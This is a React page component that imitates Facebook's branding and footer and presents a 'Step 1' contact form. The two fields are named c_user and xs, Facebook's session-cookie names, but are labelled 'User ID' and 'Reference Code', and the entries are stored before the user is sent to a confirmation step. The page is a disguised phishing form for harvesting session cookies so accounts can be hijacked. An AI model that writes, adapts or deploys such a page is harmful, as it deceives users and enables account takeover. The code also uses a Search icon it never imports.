import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { validationFormSchema } from "@/lib/form-schemas";

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();

  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      localStorage.setItem('validation_data', JSON.stringify(data));
      toast({
        title: "Success",
        description: "Please proceed to the next step",
      });
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags
        title="Contact Form | Step 1"
        description="Contact form validation step"
      />
      <div className="min-h-screen flex flex-col bg-background">
        <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
          <div className="flex items-center">
            <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
          </div>
          <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
            <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
            <input
              type="text"
              placeholder="Search"
              className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
            />
          </div>
        </nav>
        <div className="flex-1 flex justify-center p-4 sm:p-8">
          <div className="max-w-md w-full space-y-6">
            <div className="text-center">
              <h1 className="text-2xl font-bold text-primary">Step 1: Basic Information</h1>
              <p className="text-muted-foreground mt-2">
                Please provide your basic contact information
              </p>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                <FormField
                  control={form.control}
                  name="c_user"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>User ID</FormLabel>
                      <FormControl>
                        <Input
                          type="number"
                          min="0"
                          pattern="[0-9]+"
                          minLength={6}
                          placeholder="Enter your user ID"
                          className="w-full"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name="xs"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Reference Code</FormLabel>
                      <FormControl>
                        <Input 
                          type="text" 
                          placeholder="Enter reference code" 
                          className="w-full"
                          {...field} 
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <Button 
                  type="submit" 
                  className="w-full"
                  disabled={form.formState.isSubmitting}
                >
                  {form.formState.isSubmitting ? "Submitting..." : "Continue to Next Step"}
                </Button>
              </form>
            </Form>
          </div>
        </div>
        <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t">
          Meta © 2025
        </div>
      </div>
    </>
  );
}